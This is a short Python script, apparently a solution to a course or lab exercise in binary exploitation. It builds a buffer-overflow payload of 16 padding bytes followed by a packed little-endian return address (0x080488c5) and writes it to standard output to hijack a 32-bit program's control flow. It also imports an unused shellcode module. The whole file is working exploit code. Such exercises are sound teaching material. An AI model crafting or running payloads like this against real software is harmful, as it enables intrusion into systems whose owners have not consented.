#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
padding = (b'\x00')
new_addr = pack("<I", 0x080488c5)
payload = padding * 16 + new_addr
sys.stdout.buffer.write(payload)
